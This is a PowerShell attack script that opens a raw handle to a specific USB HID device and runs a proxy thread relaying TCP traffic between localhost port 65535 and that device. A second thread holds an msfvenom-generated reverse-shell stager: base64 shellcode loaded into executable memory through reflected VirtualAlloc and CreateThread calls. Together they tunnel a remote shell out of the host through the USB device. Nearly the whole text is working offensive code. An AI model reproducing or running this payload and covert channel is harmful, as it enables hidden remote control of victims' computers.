if ($M -eq $null) {
	$M = 64
	$cs = '
	using System;
	using System.IO;
	using Microsoft.Win32.SafeHandles;
	using System.Runtime.InteropServices;
	namespace n {
		public class w {
			[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
			public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
			public static FileStream o(string fn) {
				return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
			}
		}
	}
	'.Replace('%',[char]34)
	Add-Type -TypeDefinition $cs
	$devs = gwmi Win32_USBControllerDevice
	foreach ($dev in $devs) {
		$wmidev = [wmi]$dev.Dependent
		if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
		}
	}
	$f = [n.w]::o($fn)
	$device = $f
}

#================== Thread 1 code: the local proxy ==================
$Proxy = {
	Param($M, $device)
	try {
		[System.Console]::WriteLine("Entering proxy thread")
		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 65535)
		$TcpListener.Start()
		$tt = $TcpListener.BeginAcceptTcpClient($null, $null)

		$sb = New-Object Byte[] ($M+1)
		$db = New-Object Byte[] ($M+1)
		$nb = New-Object Byte[] ($M+1)

		$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)

		$stotal = 0
		$dtotal = 0
		$device_can_write = $false

		[System.Console]::WriteLine("Entering proxy loop")
		[System.Console]::WriteLine([String]::Format("M is {0}", $M))
		$device.Write($nb, 0, $M+1)
		while ($tt -ne $null -or $st -ne $null -or $dt -ne $null) {
			if ($tt -ne $null -and $tt.IsCompleted) {
				$TcpClient = $TcpListener.EndAcceptTcpClient($tt)
				$TcpListener.Stop()
				[System.Console]::WriteLine("Connection received")
				$tt = $null
				$socket = $TcpClient.GetStream()
				$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
			} elseif ($st -ne $null -and $st.IsCompleted -and $device_can_write) {
				$sbr = $socket.EndRead($st)
				if ($sbr -gt 0) {
					$stotal += $sbr
					[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
					$sb[1] = $sbr
					$device.Write($sb, 0, $M+1)
					$device_can_write = $false
					$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
				} else {
					$st = $null
				}
			} elseif ($dt.IsCompleted) {
				$dbr = $device.EndRead($dt)
				if ($dbr -gt 0) {
					$device_can_write = (($db[1] -band 128) -eq 0)
					if (!$device_can_write) {
						Write-Host "Paused!"
					}
					$write_overflow = (($db[1] -band 64) -ne 0)
					if ($write_overflow) {
						Write-Host "Overflow!"
						exit
					}
					$db[1] = ($db[1] -band 63)
					if ($db[1] -gt 0) {
						$dtotal += $db[1]
						[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
						$swo = $socket.Write($db, 2, $db[1])
						$socket.Flush()
					}
					$null = $device.Write($nb, 0, $M+1)
					$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)
				} else {
					$dt = $null
				}
			} else {
				Start-Sleep -m 1
			}
		}

	} catch {
		echo $_.Exception|format-list -force
		$ErrorMessage = $_.Exception.Message
		$FailedItem = $_.Exception.ItemName
		[System.Console]::WriteLine("Exception caught, terminating main loop")
		[System.Console]::WriteLine($ErrorMessage)
		[System.Console]::WriteLine($FailedItem)
	}

	[System.Console]::Write("Proxy thread completed")

	$device.Close()
	$socket.Close()
}

#================== Thread 2 code: the meterpreter stager ==================
$MeterpreterStager = {
	[System.Console]::WriteLine("Meterpreter thread started")
	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
	# Generated using: msfvenom -p windows/shell/reverse_tcp -f psh-reflection LHOST=127.0.0.1 LPORT=65535
	function ogz2 {
		Param ($x3Vs, $nkS7QSA)
		$shlUOd4 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

		return $shlUOd4.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($shlUOd4.GetMethod('GetModuleHandle')).Invoke($null, @($x3Vs)))), $nkS7QSA))
	}

	function jsf8RUi4D {
		Param (
			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $eUj0vp6,
			[Parameter(Position = 1)] [Type] $uXCOGO = [Void]
		)

		$uKcu45F_ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
		$uKcu45F_.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $eUj0vp6).SetImplementationFlags('Runtime, Managed')
		$uKcu45F_.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uXCOGO, $eUj0vp6).SetImplementationFlags('Runtime, Managed')

		return $uKcu45F_.CreateType()
	}

	[Byte[]]$vjavcb5X2 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVofwAAAWgCAP//ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V")

	$vUUS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll VirtualAlloc), (jsf8RUi4D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $vjavcb5X2.Length,0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($vjavcb5X2, 0, $vUUS, $vjavcb5X2.length)

	$z4da = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll CreateThread), (jsf8RUi4D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vUUS,[IntPtr]::Zero,0,[IntPtr]::Zero)
	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll WaitForSingleObject), (jsf8RUi4D @([IntPtr], [Int32]))).Invoke($z4da,0xffffffff) | Out-Null
}

#================= Launch both threads =================
$proxyThread = [PowerShell]::Create()
[void] $proxyThread.AddScript($Proxy)
[void] $proxyThread.AddParameter("M", $M)
[void] $proxyThread.AddParameter("device", $f)

$meterpreterThread = [PowerShell]::Create()
[void] $meterpreterThread.AddScript($MeterpreterStager)
[System.IAsyncResult]$AsyncProxyJobResult = $null
[System.IAsyncResult]$AsyncMeterpreterJobResult = $null

try {
	Write-Host "About to start proxy thread"
	$AsyncProxyJobResult = $proxyThread.BeginInvoke()

	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
#	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
		$proxyThread.EndInvoke($AsyncProxyJobResult)
		$proxyThread.Dispose()
	}

	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
		$meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
		$meterpreterThread.Dispose()
	}
}
